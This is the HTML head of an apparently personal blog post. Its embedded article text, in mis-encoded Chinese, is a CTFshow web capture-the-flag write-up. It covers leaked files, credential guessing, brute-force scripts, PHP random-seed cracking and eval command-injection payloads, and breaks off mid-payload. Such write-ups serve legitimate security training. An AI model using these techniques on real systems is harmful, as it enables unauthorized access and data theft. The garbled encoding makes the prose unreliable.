<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Ctfshow sqlç¯‡ | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="CTFshow_Web
ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰
Web 1-5

æŸ¥çœ‹ç½‘é¡µæºä»£ç 
æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿
æŸ¥çœ‹robots.txt
phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag

Web6
ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶">
<meta name="author" content="Sonny Calcr">
<link rel="canonical" href="http://localhost:1313/post/ctfshow_web/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.5694e7def7144bfe9060777cff84a02d56c6e9929acf2ac82614b8b0b84f3bf2.css" integrity="sha256-VpTn3vcUS/6QYHd8/4SgLVbG6ZKazyrIJhS4sLhPO/I=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow_web/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet"><meta property="og:url" content="http://localhost:1313/post/ctfshow_web/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="Ctfshow sqlç¯‡">
  <meta property="og:description" content="CTFshow_Web ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰ Web 1-5 æŸ¥çœ‹ç½‘é¡µæºä»£ç  æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿ æŸ¥çœ‹robots.txt phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag Web6 ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-02-20T00:15:50+08:00">
    <meta property="article:modified_time" content="2025-02-20T00:15:50+08:00">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="Ctfshow sqlç¯‡">
<meta name="twitter:description" content="CTFshow_Web
ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰
Web 1-5

æŸ¥çœ‹ç½‘é¡µæºä»£ç 
æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿
æŸ¥çœ‹robots.txt
phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag

Web6
ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Ctfshow sqlç¯‡",
      "item": "http://localhost:1313/post/ctfshow_web/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Ctfshow sqlç¯‡",
  "name": "Ctfshow sqlç¯‡",
  "description": "CTFshow_Web ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰ Web 1-5 æŸ¥çœ‹ç½‘é¡µæºä»£ç  æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿ æŸ¥çœ‹robots.txt phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag Web6 ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶\n",
  "keywords": [
    
  ],
  "articleBody": "CTFshow_Web ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰ Web 1-5 æŸ¥çœ‹ç½‘é¡µæºä»£ç  æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿ æŸ¥çœ‹robots.txt phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag Web6 ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶\nè§£å‹æ–‡ä»¶æˆ‘ä»¬å¾—åˆ°\næ‰“å¼€fl00g.txtï¼Œæ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flag\næ‰“å¼€index.php\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-01 14:37:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-01 14:42:44 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13//flag in fl000g.txt 14echo \"web6:where is flag?\" 15?\u003e æ˜¾ç¤ºflag in fl00g.txt\nç›´æ¥è®¿é—®url/fl00g.txtå¾—åˆ°flag\nweb7 gitæ³„éœ²ï¼Œè®¿é—®url/.gitå³å¯å¾—åˆ°flag\nweb8 svnæ³„éœ²ï¼Œè®¿é—®url/.gitå³å¯å¾—åˆ°flag\nweb9 vimç¼“å­˜ä¿¡æ¯æ³„éœ²ï¼Œè®¿é—®url/index.php.swpï¼Œæ‰“å¼€ä¸‹è½½çš„index.php.swpå³å¯å¾—åˆ°flag\nweb10 æ ¹æ®hintæŸ¥çœ‹cookieå¯ä»¥çœ‹åˆ°\ncookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D\nè¿›è¡Œurlè§£ç å³å¯å¾—åˆ°flag\nweb11 åŸŸåè§£æ\næˆ‘ä»¬å¯ä»¥é€šè¿‡nslookupæ¥è¿›è¡ŒåŸŸåè§£ææŸ¥è¯¢\nnslookup -qt=æ ¼å¼ URL nslookup -qt=any URL //éå†æ‰€æœ‰æ ¼å¼ nslookup -qt=TXT URL //æŸ¥è¯¢txtæ ¼å¼ web12 hintï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç \nå…ˆç”¨dirsearchæ‰«ä¸€ä¸‹\nè®¿é—®adminï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œæ ¹æ®åå°è·¯å¾„æˆ‘ä»¬å¯ä»¥çŒœæµ‹è´¦å·ä¸ºadmin\nå›åˆ°ä¸»é¡µï¼Œåœ¨ç½‘é¡µçš„åº•éƒ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç”µè¯Help Line Number : 372619038\nçŒœæµ‹ç”µè¯ä¸ºç®¡ç†å‘˜å¯†ç ï¼Œè¾“å…¥åæˆåŠŸå¾—åˆ°flag\nweb13 åœ¨é¡µé¢åº•éƒ¨å¯ä»¥çœ‹åˆ°ä¸€ä¸ªdocument\nç‚¹å‡»å‘ç°ä¸‹è½½äº†ä¸€ä¸ªdocument.pdfæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œæœ‰åå°çš„åœ°å€å’Œè´¦å·å¯†ç \nd\nç™»å½•åå°å³å¯å¾—åˆ°flag\nweb14 æ ¹æ®hintçŸ¥é“editorå¤„åº”è¯¥æœ‰ä¿¡æ¯æ³„æ¼(è™½ç„¶ä¸çŸ¥é“ä»€ä¹ˆæ˜¯editor)\næˆ‘ä»¬å…ˆç”¨dirsearchæ‰«ä¸€ä¸‹åå°\nè®¿é—®url/editor\næ˜¯ä¸€ä¸ªæ–‡å­—ç¼–è¾‘çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ä¸Šä¼ é™„ä»¶ğŸ“å‡ºå¯ä»¥è°ƒç”¨å‡ºåˆ°æœåŠ¡å™¨çš„æ–‡ä»¶ç®¡ç†å™¨\nåœ¨æœåŠ¡å™¨çš„æ ¹ç›®å½•æ²¡çœ‹åˆ°flagï¼Œå°è¯•æŸ¥çœ‹ç½‘ç«™çš„æ ¹ç›®å½•(var/www/html),çœ‹çœ‹æœ‰æ²¡æœ‰éšè—é¡µé¢\nå‘ç°nothinghereæ–‡ä»¶å¤¹ä¸­æœ‰ä¸ªfl00g.txtæ–‡ä»¶\nè®¿é—®url/nothinghere/f1000g.txtå³å¯å¾—åˆ°flag\nweb15 æ‰«æåˆ°åå°ä¸ºurl/adminï¼Œæ‰“å¼€çœ‹åˆ°æœ‰ä¸ªå¿˜è®°å¯†ç ï¼Œè¦æ±‚è¾“å…¥åŸå¸‚\næ ¹æ®hintæˆ‘ä»¬å¯ä»¥åœ¨ä¸»é¡µåº•éƒ¨æ‰¾åˆ°ä¸€ä¸ªqqé‚®ç®±ï¼ŒæŸ¥è¯¢ä¸€ä¸‹qqå·\nå¾—åˆ°ä¿¡æ¯ï¼Œç°å±…é™•è¥¿è¥¿å®‰\nè¾“å…¥è¥¿å®‰æˆåŠŸé‡ç½®å¯†ç ï¼Œè¾“å…¥é‡ç½®å¯†ç å’Œå¸å·adminï¼ŒæˆåŠŸå¾—åˆ°flag\nWeb16 æ¢é’ˆæ³„æ¼\ndirsearch æ‰«æä¸åˆ°è¿™ä¸ªæ¢é’ˆï¼Œçœ‹wpæ‰çŸ¥é“çš„\næ¢é’ˆåœ¨url/tz.php\nè®¿é—®æ¢é’ˆ\nåœ¨æŒ‡é’ˆé‡Œé¢å¯ä»¥æ‰¾åˆ°phpinfoé¡µé¢\næ‰“å¼€åœ¨phpinfoé‡Œé¢å¯ä»¥æ‰¾åˆ°flag\nweb17 sqlå¤‡ä»½æ³„æ¼\nç”¨dirsearchæ‰«å‡ºæ¥å­˜åœ¨sqlå¤‡ä»½æ³„æ¼ï¼Œä¸‹è½½backup.sqlï¼Œæ‰“å¼€å¾—åˆ°flag\nweb18 æœ¬é¢˜æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œç©åˆ°101åˆ†å°±èƒ½å¾—åˆ°flag\næˆ‘ä»¬ç›´æ¥çœ‹js\nFlappy_js.js\nå®¡ä¸€ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“åˆ†æ•°å¤§äº100çš„æ—¶å€™ä¼šè¾“å‡ºè¿™æ®µæ–‡å­—ï¼Œè¿™æ®µæ–‡å­—çœ‹ç€åƒunidcodeç¼–ç ï¼Œè§£ç è¯•è¯•\næ ¹æ®æç¤ºè®¿é—®url/110.php,å¾—åˆ°flag\nweb19 é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œæ ¹æ®hintæŸ¥çœ‹ç½‘é¡µæºä»£ç \næ ¹æ®æç¤ºï¼Œè¿™é“é¢˜åº”è¯¥æ˜¯ä¸€é“å¯¹å¯†ç è¿›è¡Œäº†åŠ å¯†çš„é¢˜ç›®\nå®¡é˜…ä¸€ä¸‹ä»£ç æˆ‘ä»¬å¾—åˆ°è¿™äº›ä¿¡æ¯\nmodeæ¨¡å¼ï¼š CBC padding å¡«å……æ–¹å¼ï¼š ZeroPadding å¯†æ–‡è¾“å‡ºç¼–ç ï¼š åå…­è¿›åˆ¶hex åç§»é‡iv: ilove36dverymuch å¯†é’¥ï¼š0000000372619038 å¯†æ–‡ä¸ºï¼š a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\nAES åŠ å¯†/è§£å¯† - é”¤å­åœ¨çº¿å·¥å…·\nç”¨è§£å¯†å·¥å…·è§£å¯†ä¸€ä¸‹å¯†æ–‡æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¯†ç ä¸º\nè¾“å…¥å¯†ç ï¼Œå¾—åˆ°flag\nweb20 hintï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚\nè¿™æ˜¯ä¸€ä¸ªä½¿ç”¨accessæ•°æ®åº“çš„aspç¨‹åº\næ ¹æ®æç¤ºæœ¬é¢˜å­˜åœ¨mdbæ–‡ä»¶æ³„éœ²ï¼Œé‚£æˆ‘ä»¬ç›´æ¥è®¿é—®url/db/db.mdb\nä¸‹è½½db.mdbæ–‡ä»¶åç”¨è®°äº‹æœ¬æ‰“å¼€æœç´¢flagï¼Œå³å¯å¾—åˆ° flag{ctfshow_old_database}\nçˆ†ç ´ï¼šï¼ˆå®Œå·¥ï¼‰ web21 æŠ“ä¸ªåŒ…\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„è´¦å·å¯†ç æ˜¯é€šè¿‡base64ç¼–ç åŠ å¯†åå†å‘é€çš„ï¼Œé—®é¢˜ä¸å¤§\npayloadè®¾ç½®å¦‚ä¸‹\næˆ‘ä»¬è¿˜è¦è®¾ç½®ä¸€ä¸‹payloadå¤„ç†\nå¼€å§‹çˆ†ç ´ï¼Œæ ¹æ®é•¿åº¦æˆ–è€…çŠ¶æ€ç åˆ¤æ–­å³å¯\nweb22 åŸŸåçˆ†ç ´\né€šè¿‡çˆ†ç ´ctf.showçš„å­åŸŸåå¯ä»¥çˆ†ç ´åˆ°flag.ctf.show\nè®¿é—®å³å¯å¾—åˆ°flag(è™½ç„¶å·²ç»æŒ‚äº†)\nweb23 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 11:43:51 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 11:56:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14 15include('flag.php'); 16if(isset($_GET['token'])){ 17 $token = md5($_GET['token']); 18 if(substr($token, 1,1)===substr($token, 14,1) \u0026\u0026 substr($token, 14,1) ===substr($token, 17,1)){ 19 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 20 echo $flag; 21 } 22 } 23}else{ 24 highlight_file(__FILE__); 25 26} 27?\u003e åˆ†æä»£ç å¯çŸ¥ï¼š éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ token å€¼ï¼Œä½¿å¾—ä»¥ä¸‹æ¡ä»¶æˆç«‹ï¼š\n1ã€md5(token) çš„ç¬¬ 1 ä½ï¼ˆä» 0 å¼€å§‹ç®—ï¼‰ç­‰äºç¬¬ 14 ä½\n2ã€md5(token) çš„ç¬¬ 14 ä½ç­‰äºç¬¬ 17 ä½ã€‚\n3ã€md5(token) çš„ç¬¬ 1 ä½çš„æ•´æ•°å€¼ã€14 ä½çš„æ•´æ•°å€¼ã€å’Œ 17 ä½çš„æ•´æ•°å€¼çš„å’Œé™¤ä»¥ç¬¬ 1 ä½çš„æ•´æ•°å€¼ç­‰äºç¬¬ 31 ä½çš„æ•´æ•°å€¼ã€‚\næ—¢ç„¶ä¸çŸ¥é“æ€ä¹ˆå‡‘é‚£æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´\né€šè¿‡bpçˆ†ç ´ä¸€ä¸‹1-1000ä¸­æ˜¯å¦æœ‰ç¬¦åˆä¸Šè¿°æ¡ä»¶çš„å­—ç¬¦ä¸²\nå“æˆ‘è‰ï¼Œæ€ä¹ˆå°±çˆ†ç ´å‡ºæ¥äº†ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆçº¯æ•°å­—è¿˜èƒ½çˆ†å‡ºæ¥\nå…¶ä»–è§£æ³•ï¼Œå¯ä»¥ç”¨å¤§ä½¬çš„è„šæœ¬\n1# coding: utf-8 2# alberthao 3import hashlib 4 5dic = '0123456789qazwsxedcrfvtgbyhnujmikolp' 6for a in dic: 7 for b in dic: 8 t = str(a) + str(b) 9 md5 = hashlib.md5(t.encode('utf-8')).hexdigest() 10 # print md5 11 # print md5[1:2] 12 # print md5[14:15] 13 # print md5[17:18] 14 if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: 15 if (ord(md5[1:2])) \u003e= 48 and ord(md5[1:2]) \u003c= 57 and (ord(md5[14:15])) \u003e= 48 and ord(md5[14:15]) \u003c= 57: 16 if (ord(md5[17:18])) \u003e= 48 and ord(md5[17:18]) \u003c= 57 and (ord(md5[31:32])) \u003e= 48 and ord( 17 md5[31:32]) \u003c= 57: 18 if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]): 19 print(t) or\n1import hashlib 2for i in range(1,10000): 3 4md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest() 5 6if md5[1] != md5[14] or md5[14]!= md5[17]: 7\tcontinue 8 9if(ord(md5[1]))\u003e=48 and ord(md5[1])\u003c=57 and (ord(md5[31]))\u003e=48 and ord(md5[31])\u003c=57: 10 11\tif((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])): 12 13\tprint(i) web24 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:26:39 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 13:53:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\"flag.php\"); 16if(isset($_GET['r'])){ 17 $r = $_GET['r']; 18 mt_srand(372619038); 19 if(intval($r)===intval(mt_rand())){ 20 echo $flag; 21 } 22}else{ 23 highlight_file(__FILE__); 24 echo system('cat /proc/version'); 25} 26 27?\u003e è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªphpä¼ªéšæœºæ•°çš„é¢˜ç›®\nmt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœº æ•°ã€‚ æç¤ºï¼šä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•° å› æ­¤ä¸éœ€è¦æ’­ç§ï¼Œå¹¶ä¸”å¦‚æœè®¾ç½®äº† seedå‚æ•° ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¼ªéšæœºæ•°ï¼Œæ„æ€å°±æ˜¯æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•° æ˜¯ä¸€æ ·çš„\nè™½ç„¶è¯´æ˜¯éšæœºæ•°ï¼Œä½†æ˜¯åŒä¸€ä¸ªç§å­ä¼šç”ŸæˆåŒä¸€ä¸²æ•°å­—\npoc\n1\u003c?php 2mt_srand(372619038); 3echo intval(mt_rand()); 4?\u003e ä¸çŸ¥é“è·Ÿç‰ˆæœ¬æœ‰æ²¡æœ‰å…³ç³»ï¼Œæˆ‘éšä¾¿æ‰¾çš„phpåœ¨çº¿è¿è¡Œï¼ŒæˆåŠŸå¾—åˆ°flag\nweb25 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:56:57 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 15:47:33 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15error_reporting(0); 16include(\"flag.php\"); 17if(isset($_GET['r'])){ 18 $r = $_GET['r']; 19 mt_srand(hexdec(substr(md5($flag), 0,8))); 20 $rand = intval($r)-intval(mt_rand()); 21 if((!$rand)){ 22 if($_COOKIE['token']==(mt_rand()+mt_rand())){ 23 echo $flag; 24 } 25 }else{ 26 echo $rand; 27 } 28}else{ 29 highlight_file(__FILE__); 30 echo system('cat /proc/version'); 31} ç»§ç»­phpä¼ªéšæœºæ•°\næˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªæ€§è´¨\nå½“mt_srand()ä¸­çš„ç§å­æ˜¯å›ºå®šçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”Ÿæˆçš„éšæœºæ•°çš„åºåˆ—å°±æ˜¯ç›¸åŒçš„ï¼Œå¦‚ä¸‹\n1\u003c?php 2 3mt_srand(1852100618); 4 5echo mt_rand(); 6echo mt_rand(); 7echo mt_rand(); 8echo mt_rand(); 9 10''' 111640856123 121390302953 13893879251 14859994814 åœ¨è¿™é“é¢˜é‡Œé¢æˆ‘ä»¬éœ€è¦å¾—åˆ°å‰ä¸‰ä¸ªéšæœºæ•°\nç¬¬ä¸€ä¸ªéšæœºæ•°æˆ‘ä»¬å¯ä»¥ä½¿r=0å¾—åˆ°ï¼Œç¬¬ä¸€ä¸ªéšæœºæ•°ä¸º1640856123\nå¾—åˆ°ç¬¬ä¸€ä¸ªéšæœºæ•°ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼å¾—åˆ°ç§å­ï¼Œä»è€Œå¾—åˆ°ç¬¬äºŒï¼Œç¬¬ä¸‰ä¸ªéšæœºæ•°\nphpè„šæœ¬(æå…¶æ…¢)\n1\u003c?php 2$a= 390148868;//ç¬¬ä¸€ä¸ªéšæœºæ•° 3$b= 0 ; 4while (true){ 5 mt_srand($b); 6 if(mt_rand()==$a){ 7 echo \"success:\"+$b; 8 break; 9 } 10 echo $b; 11 echo \"\\n\"; 12 $b+=1; 13 14} æˆ–è€…ä½¿ç”¨php_mt_seed-4.0å·¥å…·\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸åŒç‰ˆæœ¬çš„seedæ˜¯ä¸åŒçš„ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªè¯•è¯•å°±è¡Œäº†\n1mt_srand(1852100618); 2echo mt_rand();// ç¬¬ä¸€æ¬¡éšæœºæ•°ï¼ˆä¸èƒ½å°‘ï¼‰ 3echo \"\\ntokenï¼š\"; 4echo (mt_rand()+mt_rand()); //ç¬¬äºŒå’Œç¬¬ä¸‰æ¬¡éšæœºæ•°ç›¸åŠ ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦å¯¹token å¾—åˆ°tokençš„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿randä¸ºé›¶å³å¯å¾—åˆ°flag\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ä½¿rç­‰äºç¬¬ä¸€æ¬¡éšæœºæ•°å³å¯\nä¼ å‚ï¼Œå¾—åˆ°flag\nweb26 è¿™ä¹ˆå¤šæˆ‘å’‹çˆ†ï¼ŒèµŒä¸€æŠŠåªçˆ†å¯†ç \nweb27 è¿™é¢˜æ˜¯ä¸€ä¸ªæ•™åŠ¡ç³»ç»Ÿï¼Œéœ€è¦é€šè¿‡è´¦å·å¯†ç ç™»å½•\nå…ˆä¿¡æ¯æ”¶é›†ä¸€ä¸‹\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è´¦å·å¯†ç ä¸‹é¢æœ‰ä¸€ä¸ªå½•å–åå•å’Œå­¦ç”Ÿå­¦ç±ä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿ\nåˆ†åˆ«å¦‚ä¸Šï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡çˆ†ç ´å­¦ç”Ÿçš„èº«ä»½è¯ä¿¡æ¯ä»è€Œé€šè¿‡å½•å–æŸ¥è¯¢æŸ¥åˆ°å­¦ç”Ÿçš„ä¿¡æ¯å‘¢ï¼Ÿ\nbpæŠ“ä¸ªåŒ…\nå“æˆ‘è‰ï¼Œæˆ‘æ•°æ®å‘¢\nforwardä¸€ä¸‹ï¼ˆæ˜¯å› ä¸ºæ•°æ®å®é™…ä¸Šåœ¨checkdb.phpæ‰æäº¤å—ï¼Ÿä¸æ˜¯å¾ˆæ‡‚ï¼‰\næˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®èº«ä»½è¯ç¼ºå¤±çš„éƒ¨åˆ†åˆšå¥½æ˜¯å‡ºç”Ÿæ—¥æœŸ\né‚£æˆ‘ä»¬å¯ä»¥ç”¨bpä¸­çš„æ—¥æœŸçˆ†ç ´åŠŸèƒ½\nçˆ†å‡ºæ¥çš„msgç”¨unicodeè§£ç ä¸€ä¸‹å°±èƒ½å¾—åˆ°è´¦å·å¯†ç äº†\nè´´ä¸ªå¤§ä½¬çš„è„šæœ¬\n1url='https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php' NUM=32 2 3def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U)) 4 5class TaskRuner: def init(self,n) -\u003e None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass 6 7import aiohttp from urllib.parse import quote from datetime import date, timedelta 8 9class NYR: def init(self,start_date,end_date) -\u003e None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t\u003eself.end_date: return None self.current_date+=self.delta return t 10 11class Scanner(TaskRuner): def init(self,d1,d2,n) -\u003e None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True 12 13async def task_function(self, n): 14 while self.alive: 15 u=self.nyr.next() 16 if not u: 17 break 18 r=await self.login(u) 19 if r: 20 self.alive=False 21async def login(self,t:date): 22 url='https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php' 23 n=t.year 24 y=t.month 25 r=t.day 26 n=str(n) 27 y=str(y) 28 r=str(r) 29 if len(y)==1: 30 y='0'+y 31 if len(r)==1: 32 r='0'+r 33 sfz='621022'+n+y+r+'5237' 34 data={ 35 'a':'é«˜å…ˆä¼Š', 36 'p':sfz, 37 } 38 sess=aiohttp.ClientSession() 39 try: 40 r=await sess.post(url=url,data=data,ssl=False) 41 text=await r.text() 42 js=loads(text) 43 msg=js['msg'] 44 print(sfz,msg) 45 await sess.close() 46 return msg!='æäº¤ä¿¡æ¯æœ‰è¯¯' 47 except Exception as e: 48 print(e) 49 pass 50 try: 51 await sess.close() 52 except: 53 pass 54 return False 55 56async def handle_up(self,u,p): 57 pass 58a=Scanner(date(1990,1,1),date(2010,12,12),NUM) 59 60a.run() web28 è¿™é¢˜æœ¬æ¥ä¸çŸ¥é“è¦å¹²å˜›\ndirsearchæ‰«ä¸€ä¸‹,æ„Ÿè§‰åº”è¯¥æ˜¯ç›®å½•çˆ†ç ´\nå…ˆçˆ†ç ´ä¸€ä¸‹0-100\nå‘½ä»¤æ‰§è¡Œï¼š web29 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚\nè¿›è¡Œç»•è¿‡å°±è¡Œï¼Œè§£æ³•å¾ˆå¤š\nc=system(â€œcat fl*g.php | grep -E â€˜fl.gâ€™ â€œ);\nc=system(â€œtac 